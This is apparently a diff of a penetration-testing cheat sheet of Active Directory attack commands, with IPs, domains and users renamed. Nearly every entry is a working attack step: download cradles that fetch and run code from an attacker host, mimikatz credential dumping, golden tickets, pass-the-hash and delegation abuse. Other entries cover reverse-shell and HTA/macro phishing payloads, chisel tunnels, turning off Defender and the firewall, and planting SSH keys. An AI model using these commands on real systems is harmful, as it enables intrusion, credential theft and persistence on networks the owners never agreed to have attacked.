@@ -3,11 +3,11 @@ red team tips and trix
 
 ad enum
 ```
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/view.txt')
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/hound.txt')
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/jaws.txt')
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/up.txt')
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/sql.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/hound.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/jaws.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/up.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/sql.txt')
 ```
 ```
 invoke-mapdomaintrust | select sourcename,targetname,trustdirection
@@ -24,9 +24,9 @@ Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential
 ```
 abuse genericwrite - rbcd (Note: best way: RDP into source computer, enter SYSTEM context)
 ```
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/view.txt')
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/mad.txt')
-iwr -uri http://192.168.49.79/oRubeus.exe -outfile c:\windows\tasks\or.exe
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/mad.txt')
+iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
 ```
 ```
 New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
@@ -55,16 +55,16 @@ c:\windows\tasks\or.exe hash /password:h4x
 AA6EAFB522589934A6E5CE92C6438221
 ```
 ```
-c:\windows\tasks\or.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.comply.com /ptt
+c:\windows\tasks\or.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.corpy.com /ptt
 ```
 ```
-iwr -uri http://192.168.49.79/psexec.exe -outfile c:\windows\tasks\psexec.exe
+iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
 ```
 ```
-dir \\jump09.ops.comply.com\C$
+dir \\jump09.ops.corpy.com\C$
 ```
 ```
-c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.comply.com cmd
+c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
 ```
 abuse services
 ```
@@ -87,7 +87,7 @@ net localgroup administrators
 ```
 abuse writedacl
 ```
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/view.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
 ```
 ```
 $SecPassword = ConvertTo-SecureString '4dfgdfFFF542' -AsPlainText -Force
@@ -97,10 +97,10 @@ $Cred = New-Object System.Management.Automation.PSCredential('TRICKY\sqlsvc', $S
 Add-DomainObjectAcl -PrincipalIdentity sqlsvc -TargetIdentity "MAILADMINS" -Rights All -Credential $Cred -Verbose
 ```
 ```
-Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'will' -Credential $Cred -Verbose
+Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'willy' -Credential $Cred -Verbose
 ```
 ```
-get-domainuser will
+get-domainuser willy
 Get-DomainGroupMember -Identity 'MAILADMINS'
 ```
 chisel socks (win)
@@ -108,8 +108,8 @@ chisel socks (win)
 /opt/chisel/chisel server -p 8000 --reverse
 ```
 ```
-bitsadmin /Transfer myJob http://192.168.49.79/chisel.exe c:\windows\tasks\chisel.exe
-c:\windows\tasks\chisel.exe client 192.168.49.79:8000 R:8001:socks
+bitsadmin /Transfer myJob http://192.168.10.11/chisel.exe c:\windows\tasks\chisel.exe
+c:\windows\tasks\chisel.exe client 192.168.10.11:8000 R:8001:socks
 ```
 ```
 vi chi.conf
@@ -119,16 +119,16 @@ proxy_dns
 socks5 127.0.0.1 8001
 ```
 ```
-proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.tricky.com 
+proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
 ```
 chisel socks (lin)
 ```
 /opt/chisel/chisel server -p 8000 --reverse
 ```
 ```
-wget http://192.168.49.79/chisel -O /tmp/chisel
+wget http://192.168.10.11/chisel -O /tmp/chisel
 chmod 777 /tmp/chisel
-/tmp/chisel client 192.168.49.79:8000 R:8001:socks
+/tmp/chisel client 192.168.10.11:8000 R:8001:socks
 ```
 ```
 vi web05.conf
@@ -138,10 +138,10 @@ proxy_dns
 socks5 127.0.0.1 8001
 ```
 ```
-export KRB5CCNAME=/home/kali/osep/labs/ccc5/krb5cc.pete
+export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
 ```
 ```
-proxychains -q -f web05.conf impacket-psexec complyedge.com/pete@dmzdc01.complyedge.com -k -no-pass
+proxychains -q -f web05.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
 ```
 constrained delegation
 ```
@@ -157,7 +157,7 @@ get-domaincomputer -trustedtoauth
 c:\tools\Rubeus.exe hash /password:lab
 ```
 ```
-iwr -uri http://192.168.49.79/oRubeus.exe -outfile c:\windows\tasks\or.exe
+iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
 ```
 ```
 c:\windows\tasks\or.exe asktgt /user:web01$ /domain:evil.com /rc4:004686491797c2704948c687eb203845
@@ -171,7 +171,7 @@ proxychains -q -f web05.conf crackmapexec smb ips.txt -u administrator -H 8388d0
 ```
 cme spray pwd
 ```
-proxychains -q -f met.conf crackmapexec smb ips.txt -u 'will' -p 'fdsfssdfDFG4'
+proxychains -q -f met.conf crackmapexec smb ips.txt -u 'willy' -p 'fdsfssdfDFG4'
 ```
 enable rdp
 ```
@@ -188,16 +188,16 @@ escape constrained language -> rs + runspace
 sudo rlwrap nc -lvnp 3389
 ```
 ```
-python3 makers.py -l 192.168.49.79 -p 3389
+python3 makers.py -l 192.168.10.11 -p 3389
 ```
 ```
-python3 makerunspace.py -a 64 -l 192.168.49.79 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.49.79/rs.txt")'
+python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
 ```
 extra sids - krbtgt way (ref lab 16)
 ```
-iwr -uri http://192.168.49.79/mimikatz.exe -outfile c:\windows\tasks\m.exe
-iwr -uri http://192.168.49.79/oRubeus.exe -outfile c:\windows\tasks\or.exe
-iwr -uri http://192.168.49.79/psexec.exe -outfile c:\windows\tasks\psexec.exe
+iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
+iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
+iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
 ```
 ```
 c:\windows\tasks\psexec.exe -accepteula -i -u "NT AUTHORITY\SYSTEM" cmd
@@ -209,7 +209,7 @@ c:\windows\tasks\m.exe "privilege::debug"
 kerberos::golden /user:h4x /domain:CURRENT_DOMAIN /sid:CURRENT_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:TARGET_DOMAIN_SID-519 /ptt
 ```
 ```
-dir \\rdc02.comply.com\c$
+dir \\rdc02.corpy.com\c$
 ```
 gobuster
 ```
@@ -227,18 +227,18 @@ kerberos::golden /user:fakeuser /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KR
 ```
 impacket-psexec - kerberos
 ```
-export KRB5CCNAME=/home/kali/osep/labs/ccc5/krb5cc.pete
+export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
 ```
 ```
-proxychains -q -f ssh.conf impacket-psexec complyedge.com/pete@dmzdc01.complyedge.com -k -no-pass
+proxychains -q -f ssh.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
 ```
 impacket-psexec - pth
 ```
-proxychains -q -f met.conf impacket-psexec administrator@sql05.tricky.com -hashes aad3b435b51404eeaad3b435b51404ee:2060951907129392809244825245de08
+proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes aad3b435b51404eeaad3b435b51404ee:2060951907129392809244825245de08
 ```
 impacket-psexec - pwd
 ```
-proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.tricky.com 
+proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
 ```
 killdef
 ```
@@ -250,7 +250,7 @@ netsh advfirewall set allprofiles state off
 ```
 laps alternative (if laps.txt isn't working) (switch domain if have to)
 ```
-iex(new-object net.webclient).downloadstring('http://192.168.49.79/view.txt')
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
 ```
 ```
 Get-DomainComputer | Foreach-Object {$_ | Select name,ms-mcs-admpwd}
@@ -264,34 +264,34 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 makehta + makers + makerunspace + swaks
 ```
-python3 makers.py -l 192.168.49.79 -p 443
+python3 makers.py -l 192.168.10.11 -p 443
 ```
 ```
-python3 makerunspace.py -a 64 -l 192.168.49.79 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.49.79/rs.txt")'
+python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
 ```
 ```
-python3 makehta.py -a 64 -l 192.168.49.79 -p 443 -t cmd -c 'bitsadmin /Transfer Hatealfredchar http://192.168.49.79/file.txt c:\windows\tasks\Kansaslackdad.txt'
+python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'bitsadmin /Transfer Hatealfredchar http://192.168.10.11/file.txt c:\windows\tasks\Kansaslackdad.txt'
 ```
 ```
-swaks --to Will@tricky.com --from fake@tricky.com --server mail01.tricky.com --port 25 --body @body.txt
+swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
 ```
 ```
-python3 makehta.py -a 64 -l 192.168.49.79 -p 443 -t cmd -c 'cmd /c certutil -decode c:\windows\tasks\Kansaslackdad.txt c:\windows\tasks\Plasticsthicknessscale.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Plasticsthicknessscale.exe'
+python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'cmd /c certutil -decode c:\windows\tasks\Kansaslackdad.txt c:\windows\tasks\Plasticsthicknessscale.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Plasticsthicknessscale.exe'
 ```
 ```
-swaks --to Will@tricky.com --from fake@tricky.com --server mail01.tricky.com --port 25 --body @body.txt
+swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
 ```
 makemacro
 ```
-python3 makemacro.py -a 64 -l 192.168.49.79 -p 443 -f inject -t doc -d ps1 -r 1
+python3 makemacro.py -a 64 -l 192.168.10.11 -p 443 -f inject -t doc -d ps1 -r 1
 ```
 makerunspace inject
 ```
-python3 makerunspace.py -a 64 -l 192.168.49.79 -p 443 -b Inject
+python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b Inject
 ```
 makewrap -> use -p 1433 to avoid clashing with basic.rc (-p 443)
 ```
-python3 makewrap.py -a 64 -l 192.168.49.79 -p 1433
+python3 makewrap.py -a 64 -l 192.168.10.11 -p 1433
 ```
 met socks
 ```
@@ -312,8 +312,8 @@ socks5 127.0.0.1 1080
 ```
 mimi dump
 ```
-iwr -uri http://192.168.49.79/mimidrv.sys -outfile c:\windows\tasks\mimidrv.sys
-iwr -uri http://192.168.49.79/mimikatz.exe -outfile c:\windows\tasks\m.exe
+iwr -uri http://192.168.10.11/mimidrv.sys -outfile c:\windows\tasks\mimidrv.sys
+iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
 ```
 ```
 c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
@@ -324,18 +324,18 @@ mimi pth
 c:\windows\tasks\m.exe "privilege::debug" 
 ```
 ```
-sekurlsa::pth /user:pete /domain:complyedge.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
+sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
 ```
 ```
 sekurlsa::pth /user:administrator /domain:web06 /ntlm:f99529e42ee77dc4704c568ba9320a34 /run:"mstsc.exe /restrictedadmin"
 ```
 mssqlclient
 ```
-proxychains -q -f met.conf impacket-mssqlclient will:'fdsfssdfDFG4'@sql05.tricky.com -windows-auth
+proxychains -q -f met.conf impacket-mssqlclient willy:'fdsfssdfDFG4'@sql05.corpy.com -windows-auth
 ```
 mssql.exe shortcut
 ```
-iwr -uri http://192.168.49.79/MSSQL.exe -outfile c:\windows\tasks\Parishcopsomewhat.exe
+iwr -uri http://192.168.10.11/MSSQL.exe -outfile c:\windows\tasks\Parishcopsomewhat.exe
 cmd /c c:\windows\tasks\Parishcopsomewhat.exe
 ```
 nmap hybrid + automate
@@ -360,7 +360,7 @@ proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t 
 ```
 ```
 # current sql
-xp_dirtree '\\192.168.49.79\a';
+xp_dirtree '\\192.168.10.11\a';
 ```
 powershell cred
 ```
@@ -370,11 +370,11 @@ $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user
 ```
 printspoofer
 ```
-python3 makerunspace.py -a 64 -l 192.168.49.79 -p 443 -b PipePipe
+python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
 ```
 ```
-iwr -uri http://192.168.49.79/Runspace.exe -outfile c:\windows\tasks\Compromisewisdomwide.exe
-iwr -uri http://192.168.49.79/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
+iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Compromisewisdomwide.exe
+iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
 ```
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Compromisewisdomwide.exe
@@ -395,10 +395,10 @@ channel -i 1
 ```
 psexec.exe
 ```
-iwr -uri http://192.168.49.79/psexec.exe -outfile c:\windows\tasks\psexec.exe
+iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
 ```
 ```
-c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.comply.com cmd
+c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
 ```
 ```
 c:\windows\tasks\psexec.exe -accepteula -i -u "NT Authority\SYSTEM" cmd
@@ -408,29 +408,29 @@ rdp restrictedadmin / rdp pth
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
 ```
 ```
-proxychains -q -f web05.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.complyedge.com /cert-ignore
+proxychains -q -f web05.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
 ```
 ```
-iwr -uri http://192.168.49.79/mimikatz.exe -outfile c:\windows\tasks\m.exe
+iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
 ```
 ```
 c:\windows\tasks\m.exe "privilege::debug" 
 ```
 ```
-sekurlsa::pth /user:pete /domain:complyedge.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
+sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
 ```
 ```
 sekurlsa::pth /user:administrator /domain:file06 /ntlm:8821c97bc6b3d2aed6e30a9540f208f3 /run:"mstsc.exe /restrictedadmin"
 ```
 runspace shortcut (powershell)
 ```
-iwr -uri http://192.168.49.79/Runspace.exe -outfile c:\windows\tasks\Tbsegabilly.exe
+iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Tbsegabilly.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
 
 ```
 runspace shortcut (cmd)
 ```
-bitsadmin /Transfer myJob http://192.168.49.79/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
+bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
 ```
 sql enum
@@ -459,16 +459,16 @@ ssh authorized_keys
 echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0pEdTg2aEJycDBWeXZibjhxSHhRWnprc3F2SWlJU1lYZDRxaW90b1padHRMTGlTSS9GWVFxT2xUUDBIeDFaUWNyZ0J3RmZObnB1dGJpK0lEb0RKeXo5QkxtSDE3WGhvYnF6Wk95bkREY1gzb2ZDeDY2a1YwZk5nSzhKTy91ZGhLNjZvc3pXaDdWUHgrOWJFajl6V1JjM3dvRUt4aDc2NVF2QTN6aVJQZ2NLRzFPWHBReVRRZE5oNVI0MVpCRkR2RDM3MFhSL3dMd0pYWnY4K3BEbjZidzFIQ3JNb00yNENJdFVlUmpvSVJhN25mTkluM2dzampRZ2NudC8wYlBYWE44c0lhamdNL1Fsb3ViaWlTclBna2xPNmJNS2RrRHpYTGlJdTNUYmNwNTVQbHVlNm15K0hOdWthYjdOa1U0akw5SjhobXZzZnBlcW9BMzJZdlUrTUhVQ0FmRFNkbHdtRFJscVFmS0kvcXh0cCtLMFFzSjNEK1ZDUHpNcGtlV2xHd1I3OW55WDNiQUZESVhtd1YyaEtldDJ5dWIxanMxMFYwTU5nSi9nMk1OTms5WVJrQ3NRcXptQ3VNajN6TG9Qa1krTmFMZjd4cUdJSTZSYW1zUnNTL01kNzF3T3ZGNjlpN2JhVklycTN4VTQxeVQ1bWM9IGthbGlAa2FsaQo=" | base64 -d >> authorized_keys
 ```
 ```
-ssh -i ~/.ssh/id_rsa 'pete@complyedge.com'@192.168.106.164
+ssh -i ~/.ssh/id_rsa 'pat@corpy.com'@192.168.106.164
 ```
 unconstrained delegation (notes: always use meterpreter to run rubeus and capture tix!!)
 ```
 Get-DomainComputer -Unconstrained
 ```
 ```
-iwr -uri http://192.168.49.79/oRubeus.exe -outfile c:\windows\tasks\or.exe
-iwr -uri http://192.168.49.79/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
-iwr -uri http://192.168.49.79/mimikatz.exe -outfile c:\windows\tasks\m.exe
+iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
+iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
+iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
 ```
 ```
 # this part on meterpreter!!
@@ -491,9 +491,9 @@ wget http://192.168.49.80/wrap.txt -O /tmp/Fluzaspecialties.txt;chmod 777 /tmp/F
 ```
 xfreerdp pth
 ```
-proxychains -q -f ssh.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.complyedge.com /cert-ignore
+proxychains -q -f ssh.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
 ```
 xfreerdp pwd
 ```
-proxychains -q -f web05.conf xfreerdp /u:administrator /d:dmzdc01.complyedge.com /p:fgds90345SDfsw32 /v:dmzdc01.complyedge.com /cert-ignore
+proxychains -q -f web05.conf xfreerdp /u:administrator /d:dmzdc01.corpy.com /p:fgds90345SDfsw32 /v:dmzdc01.corpy.com /cert-ignore
 ```
